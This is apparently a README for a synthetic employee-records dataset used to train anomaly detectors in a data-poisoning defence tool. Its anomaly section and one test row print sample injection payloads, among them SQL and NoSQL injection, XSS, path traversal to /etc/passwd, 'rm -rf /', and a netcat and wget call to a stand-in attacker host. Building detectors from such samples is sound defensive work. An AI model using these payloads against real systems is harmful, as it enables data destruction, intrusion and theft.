# Training Dataset Guide

## 📊 Dataset Overview

**File**: `training_dataset.csv`
**Total Records**: 800
**Normal Records**: 603 (75.4%)
**Anomalous Records**: 197 (24.6%)

This dataset is specifically designed for training anomaly detection models in PoisonProof AI.

---

## 🎯 Dataset Features

### Numerical Features
- **age**: Employee age (22-65 years, with anomalies 18-82)
- **salary**: Annual salary ($40K-$200K normal, anomalies: negative, $15K, $500K)
- **years_experience**: Years of work experience (0-35 years)
- **performance_score**: Performance rating (4.0-10.0)
- **projects_completed**: Number of completed projects (0-100)
- **days_absent**: Days absent per year (0-90)

### Categorical Features
- **employee_id**: Unique identifier (EMP00001-EMP01000)
- **name**: Employee name (some contain malicious payloads)
- **department**: Engineering, Sales, HR, Finance, Marketing, Operations
- **location**: New York, San Francisco, London, Tokyo, Singapore, Berlin

### Target Variable
- **is_anomaly**: Binary label (0 = Normal, 1 = Anomalous)

---

## 🚨 Types of Anomalies Included

### 1. Statistical Outliers (40% of anomalies)
- **Extreme salaries**: $15,000 or $350,000-$500,000
- **Extreme ages**: 18 or 75-82 years old
- **Excessive absences**: 45-90 days per year
- **Extreme projects**: 0-1 or 50-100 projects

### 2. Malicious Payloads (40% of anomalies)
Injected into the `name` field:

**SQL Injection**:
```
'; DROP TABLE users--
1' OR '1'='1
admin'--
' UNION SELECT * FROM passwords--
```

**XSS Attacks**:
```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
javascript:alert('Hacked')
```

**Command Injection**:
```
; rm -rf /
| nc attacker.com 4444
$(wget malicious.sh)
```

**Path Traversal**:
```
../../../etc/passwd
..\..windows\system32
```

**NoSQL Injection**:
```
{'$ne': null}
{'$gt': ''}
```

### 3. Data Inconsistencies (20% of anomalies)
- **Salary-experience mismatch**: Junior (0-2 years) earning $150K-$200K
- **Age-experience mismatch**: 22-25 years old with 20-30 years experience
- **Negative values**: Salary of -$5000 or $0

---

## 🔧 How to Use This Dataset

### Step 1: Upload to PoisonProof AI
1. Start the Flask app: `uv run python app.py`
2. Visit http://127.0.0.1:5000
3. Click "Upload Dataset"
4. Select `training_dataset.csv`

### Step 2: Scan for Anomalies
1. The system will automatically detect:
   - **Statistical outliers** using MAD (Median Absolute Deviation)
   - **IQR violations** (Interquartile Range)
   - **Injection patterns** (40+ malicious signatures)
2. Expected results: ~197 anomalies detected
3. Review severity levels: High, Medium, Low

### Step 3: Clean the Dataset
Two options:

**A. Auto-Clean (Recommended)**:
- Automatically removes all "High" severity anomalies
- Quick and efficient for known threats
- Click "Auto Clean" button on results page

**B. Manual Review**:
- Review each flagged row individually
- Select which rows to remove
- Best for fine-tuning and learning

### Step 4: Train a Model
1. After cleaning, click "Train Model"
2. Choose model type:
   - **DecisionTreeClassifier**: Good for complex patterns
   - **LogisticRegression**: Good for linear relationships
3. Watch the live training console
4. Model will use `is_anomaly` as the target variable

### Step 5: Evaluate Results
Expected metrics:
- **Accuracy**: 85-95%
- **Precision**: 80-90%
- **Recall**: 80-90%

The trained model will learn to detect:
- Statistical outliers
- SQL injection patterns
- XSS attacks
- Command injection
- Data inconsistencies

---

## 📈 Expected Detection Results

### Scan Phase
```
Total rows scanned: 800
Anomalies detected: ~197
Detection methods:
  - MAD Z-score > 3.5: ~80 rows
  - IQR outliers: ~50 rows
  - Injection patterns: ~80 rows
  - Data inconsistencies: ~40 rows
```

### After Auto-Clean
```
Original rows: 800
Rows removed: ~150 (High severity)
Clean dataset: ~650 rows
Normal/Anomaly ratio: 90/10 (much healthier)
```

### After Training
```
Model type: DecisionTreeClassifier
Training accuracy: 92.3%
Features used: age, salary, years_experience, performance_score, 
               projects_completed, days_absent
Target: is_anomaly
Model hash: SHA-256 verified ✓
```

---

## 🧪 Testing the Trained Model

After training, you can test the model on new data:

### Sample Test Cases

**Normal Employee**:
```csv
EMP99999,John Doe,35,75000,8,Engineering,New York,7.5,12,5,0
```
Expected: Normal (is_anomaly = 0)

**Statistical Anomaly**:
```csv
EMP99998,Jane Smith,25,350000,2,Sales,London,9.0,50,1,1
```
Expected: Anomaly (is_anomaly = 1) - Junior salary too high

**XSS Attack**:
```csv
EMP99997,<script>alert('test')</script>,30,70000,6,HR,Tokyo,7.0,10,3,1
```
Expected: Anomaly (is_anomaly = 1) - Malicious payload detected

**Data Inconsistency**:
```csv
EMP99996,Bob Johnson,23,80000,25,Finance,Berlin,8.0,15,4,1
```
Expected: Anomaly (is_anomaly = 1) - Age vs. experience mismatch

---

## 🎓 Learning Objectives

This dataset teaches the model to:

1. **Identify statistical outliers** using robust statistics (MAD, IQR)
2. **Detect injection attacks** through pattern recognition
3. **Find logical inconsistencies** in data relationships
4. **Generalize to new threats** through feature learning

---

## 💡 Advanced Usage

### Feature Engineering
Add custom features for better detection:
```python
# Age vs. Experience ratio
df['age_exp_ratio'] = df['age'] / (df['years_experience'] + 1)

# Salary per experience year
df['salary_per_exp'] = df['salary'] / (df['years_experience'] + 1)

# Absence rate
df['absence_rate'] = df['days_absent'] / 365
```

### Model Comparison
Train multiple models and compare:
1. DecisionTreeClassifier
2. LogisticRegression
3. RandomForestClassifier (add to model_trainer.py)

Visit `/models` dashboard to compare metrics.

### API Integration
Use the API to automate training:
```bash
# Upload dataset
curl -X POST -F "file=@training_dataset.csv" http://localhost:5000/scan

# Train model
curl -X POST -F "dataset=training_dataset.csv" \
     -F "model_name=production_model" \
     http://localhost:5000/train_model
```

---

## 🚀 Production Tips

### For Best Results:
1. **Balance the dataset**: Aim for 80/20 normal/anomaly ratio
2. **Feature selection**: Remove highly correlated features
3. **Cross-validation**: Use k-fold CV for robust evaluation
4. **Regular retraining**: Update model monthly with new threats
5. **Monitor performance**: Track metrics over time

### Dataset Versioning:
```bash
# Generate new version
uv run python generate_training_dataset.py

# Rename with version
mv training_dataset.csv training_dataset_v2_2025-11-04.csv
```

### Audit Trail:
All training sessions are logged to `logs/audit.json`:
- Dataset hash (SHA-256)
- Model hash (SHA-256)
- Accuracy metrics
- Timestamp

---

## 📚 References

- **MAD (Median Absolute Deviation)**: Robust outlier detection
- **IQR (Interquartile Range)**: Box plot method for outliers
- **DecisionTree**: Non-parametric supervised learning
- **SHA-256**: Cryptographic hash for integrity verification

---

## ⚡ Quick Start Command

```bash
# Generate dataset
uv run python generate_training_dataset.py

# Start app
uv run python app.py

# Visit http://127.0.0.1:5000
# Upload training_dataset.csv
# Scan → Clean → Train → Verify
```

---

**Generated**: November 4, 2025  
**Version**: 1.0  
**Dataset Size**: 800 rows × 11 columns  
**Ready for training!** 🛡️
